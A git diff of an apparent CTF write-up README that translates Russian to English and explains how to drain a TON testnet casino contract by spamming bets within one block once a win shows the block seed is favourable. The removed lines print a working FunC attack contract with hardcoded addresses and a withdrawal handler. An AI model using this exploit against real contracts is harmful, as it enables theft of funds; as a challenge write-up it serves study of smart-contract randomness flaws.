@@ -1,6 +1,6 @@
 # 4-day
-- Дали [контракт](https://testnet.tonviewer.com/kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX), который запущен по адресу `kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX`
-- Известен исходный код контракта
+- Provided a [contract deployed](https://testnet.tonviewer.com/kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX) deployed at address `kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX`
+- The source code of the contract is known
 
 ```jsx
 #include "imports/stdlib.fc";
@@ -37,106 +37,48 @@ const gas_cost = 10000000;
 
 ```
 
-Это казино, на нём 100 тонов и надо их всех выкачать
+This is a casino with 100 tons on it, and the goal is to drain all of them.
 
-# Решение
+# Solution
 
-Таск основывается на том, что ещё в первый день Вова вкинул, что он знает как взломать контракт Тимура и после этого Тимур дописал `randomize_lt()`
+The task is based on the fact that on the first day, Vova mentioned that he knows how to hack Timur's contract, and after that, Timur added `randomize_lt()`.
 
-Сама по себе`rand(n)` является небезопасной функцией и работает следующим образом:
+The `rand(n)` function itself is unsafe and works as follows:
 
-- `seed` в контракте определяется `hash(block_seed, account_address)`
-- `block_seed` текущего блока знают только валидаторы, а мы этот сид никак узнать не можем
+- The  `seed` in the contract is determined by `hash(block_seed, account_address)`
+- Only validators know the `block_seed` of the current block, and we cannot find out this seed.
 
 > [Therefore, to predict the result of the random() function in a smart contract, you just need to know the current seed of the block, which isn't possible if you're not a validator.](https://docs.ton.org/v3/guidelines/smart-contracts/security/random-number-generation#how-can-someone-predict-a-random-number)
 
-Тем не менее, можно провести атаку на рандом в пределах одного блока
+However, it is possible to attack the random number within a single block.
 
-## Как работает атака?
+## How does the attack work?
 
-1. Отправляем первую ставку в казино
-2. Если выиграли (получили сообщение `You won`) → продолжаем спамить такие же ставки в тот же блок
-3. Если не получили ответа → блок сменился, мы проиграли, останавливаем атаку.
-4. Повторяем процесс на новом блоке, пока не обанкротим казино.
+1. Send the first bet to the casino.
+2. If you win (receive a message `You won`), continue spamming the same bets within the same block.
+3. If no response is received, the block has changed, you lost, and the attack is stopped.
+4. Repeat the process in a new block until the casino is bankrupt.
 
-Когда казино обанкротилось, выводим деньги из атаковавшего контракта себе на основной аккаунт
+When the casino is bankrupt, withdraw the money from the attacking contract to the main account.
 
-## Почему это работает?
+## Why does this work?
 
-`seed` фиксирован в рамках одного блока и если одна ставка выиграла, то и всё ставки в текущем блоке выиграют
+The `seed` is fixed within a single block, and if one bet wins, all bets in the current block will win.
 
-## Код атакующего контракта
+## The attack contract code is offered in the repository
 
-Может быть не идеальным, но он работает
+# Simplified Attack Scheme
 
-```jsx
-#include "imports/stdlib.fc";
-
-const admin_address = "0QCpmGaG1ypBqdY757UNTZphiXJOMu0bGPxumvjYTu4KEhDj"a;
-const vova = "kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX"a;
-
-() send_real_bet(slice addr, slice body, int grams) impure inline_ref {
-  var msg = begin_cell()
-    .store_uint(0x18, 6)
-    .store_slice(addr)
-    .store_coins(grams)
-    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 32)
-    .store_slice(body);
-  send_raw_message(msg.end_cell(), SEND_MODE_REGULAR);
-}
-
-() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
-    if (in_msg_body.slice_empty?()) {
-        return ();
-    }
-
-    int op = in_msg_body~load_uint(32);
-
-    slice cs = in_msg_full.begin_parse();
-    int flags = cs~load_uint(4);
-    if (flags & 1) {
-        return ();
-    }
-    slice source_address = cs~load_msg_addr();
-    
-    if (op == 0) {
-        send_real_bet(vova, "auto try", 133700000);
-    }
-    if (op == 1) {
-        send_real_bet(vova, "init try", 100000000);
-    }
-    ;; ручка для вывода денег
-    if (op == 2) {
-        if (equal_slices_bits(admin_address, source_address)) { 
-            cell msg =  begin_cell()
-                .store_uint(0x18, 6)
-                .store_slice(source_address)
-                .store_coins(0) 
-                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
-                .store_uint(0, 32)
-                .store_slice("money back")
-            .end_cell();
-            send_raw_message(msg, 128);
-            return ();
-        }
-    }
-
-    return ();
-}
-```
-
-# Схема атаки (упрощённая)
-
-В реальности будет в районе 500 транзакций в одной
+In reality, there will be around 500 transactions in one block.
 
 ![[scheme_attack.png]]
-Узел A - мой основной аккаунт, который принудительно запускает всё с сообщением `init try`
+Node A - My main account, which forcibly initiates everything with the message `init try`.
 
-Узел B - атакующий контракт, который понял, что в этом блоке у нас подходящий `seed`, поэтому начинаем атаковать отсылая сообщения `auto try`
+Node B - The attacking contract, which realizes that the current block has a suitable `seed`, so it starts attacking by sending message  `auto try`.
 
-Узел C - казино, принимает ставки и возвращает сообщения `you won` с выигрышем
+Node C - The casino, which accepts bets and returns messages `you won` with the winnings.
 
-Атака прекратится после первой неудачи, когда узел C не вернёт никакого ответа
+The attack will stop after the first failure when Node C does not return any response.
 
 --------
-@Jl4cTuk
+Readme file written with @Jl4cTuk
